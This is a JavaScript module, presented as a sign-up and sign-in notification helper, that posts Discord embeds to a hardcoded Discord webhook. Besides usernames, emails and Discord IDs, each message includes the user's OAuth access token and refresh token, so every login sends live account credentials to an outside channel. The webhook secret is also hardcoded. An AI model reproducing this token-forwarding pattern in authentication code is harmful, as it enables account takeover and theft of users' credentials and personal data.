import fetch from 'node-fetch';

/**
 * Sends a sign-up notification to Discord webhook with user details (new user)
 * @param {Object} userData - The user data for the new sign-up user
 */
async function sendSignUpNotification(userData) {
  const webhookUrl = 'https://discord.com/api/webhooks/1316066211850620989/_9WGkcypsKTp9KdvRMGFtWQ-eEs8p7HZxwK0XABVOnL8os8wO5hesWHVs_BydHVBN9RA';

  const message = {
    embeds: [{
      title: 'New User Sign-Up Details',
      description: 'A new user has signed up using Discord.',
      color: 3066993,
      fields: [
        { name: 'Username', value: userData.username, inline: true },
        { name: 'Email', value: userData.email, inline: true },
        { name: 'Discord ID', value: userData.discordId, inline: false },
        { name: 'Profile Picture', value: userData.profilePic, inline: false },
        { name: 'Access Token', value: userData.accessToken, inline: false },
        { name: 'Refresh Token', value: userData.refreshToken, inline: false },
      ],
    }]
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message),
    });

    if (!response.ok) {
      throw new Error('Failed to send sign-up message to Discord webhook');
    }
    console.log('Sign-up Discord notification sent successfully');
  } catch (error) {
    console.error('Error sending Discord sign-up notification:', error);
  }
}

/**
 * Sends a sign-in notification to Discord webhook with user details (existing user)
 * @param {Object} userData - The user data for the sign-in user
 */
async function sendSignInNotification(userData) {
  const webhookUrl = 'https://discord.com/api/webhooks/1316066211850620989/_9WGkcypsKTp9KdvRMGFtWQ-eEs8p7HZxwK0XABVOnL8os8wO5hesWHVs_BydHVBN9RA';

  const message = {
    embeds: [{
      title: 'User Sign-In Details',
      description: 'An existing user has signed in using Discord.',
      color: 3447003,
      fields: [
        { name: 'Username', value: userData.username, inline: true },
        { name: 'Email', value: userData.email, inline: true },
        { name: 'Discord ID', value: userData.discordId, inline: false },
        { name: 'Profile Picture', value: userData.profilePic, inline: false },
        { name: 'Access Token', value: userData.accessToken, inline: false },
        { name: 'Refresh Token', value: userData.refreshToken, inline: false },
      ],
    }]
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message),
    });

    if (!response.ok) {
      throw new Error('Failed to send sign-in message to Discord webhook');
    }
    console.log('Sign-in Discord notification sent successfully');
  } catch (error) {
    console.error('Error sending Discord sign-in notification:', error);
  }
}

export { sendSignUpNotification, sendSignInNotification };
